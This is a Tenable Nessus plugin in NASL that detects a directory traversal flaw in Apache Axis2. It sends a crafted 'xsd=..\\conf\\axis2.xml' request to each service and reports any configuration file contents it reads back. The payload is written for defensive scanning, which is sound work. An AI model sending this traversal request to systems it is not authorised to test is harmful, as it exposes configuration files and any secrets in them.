#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(46741);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2015/03/26 13:38:38 $");

  script_bugtraq_id(40343);
  script_osvdb_id(59001);
  script_xref(name:"EDB-ID", value:"12721");

  script_name(english:"Apache Axis2 'xsd' Parameter Directory Traversal");
  script_summary(english:"Attempts to read the 'axis2.xml' file.");

  script_set_attribute(attribute:"synopsis", value:
"A web application on the remote host is affected by a directory
traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Apache Axis2 installed on the remote host is affected
by a directory traversal vulnerability due to improper sanitization of
user-supplied input to the 'xsd' parameter in activated services. An
attacker can exploit this issue to read arbitrary files on the
affected host.");
  script_set_attribute(attribute:"see_also", value:"https://issues.apache.org/jira/browse/AXIS2-4279");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Apache Axis2 1.5 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/03/20");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/06/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/05/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:axis2");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("apache_axis2_detect.nasl");
  script_require_ports("Services/www", 8080);
  script_require_keys("installed_sw/Axis2");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Axis2";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:8080);

install = get_single_install(
  app_name : app,
  port     : port
);

# Directory traversal is exploited through any of the services.
# We can determine active services with /axis2/services/listServices
dir = install['path'];
install_url = build_url(port:port, qs:dir);

dist = get_kb_item(app+'/'+port+dir+'/dist');
if (isnull(dist)) exit(1, "The '"+app+"/"+port+dir+"/dist' KB item is missing.");

services = get_kb_item(app+'/'+port+dir+'/services');
if (isnull(services)) exit(0, "No services were detected for "+app+" on port "+port+".");

services = split(services, sep:',', keep:FALSE);
if (!thorough_tests) services = make_list(services[0]);

# Attempt to retrieve /conf/axis2.xml
foreach service (services)
{
  url = '/services/'+service+'?xsd=..\\conf\\axis2.xml';
  res = http_send_recv3(method:"GET", item:dir+url, port:port, exit_on_fail:TRUE);
  if (
    '~ Licensed to the Apache Software Foundation' >< res[2] &&
    '<axisconfig name="AxisJava2.0">' >< res[2]
  )
  {
    output = strstr(res[2], '<parameter');
    if (empty_or_null(output)) output = res[2];

    security_report_v4(
      port        : port,
      severity    : SECURITY_WARNING,
      file        : '/conf/axis2.xml',
      request     : make_list(install_url + url),
      output      : chomp(output),
      attach_type : 'text/plain'
    );
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
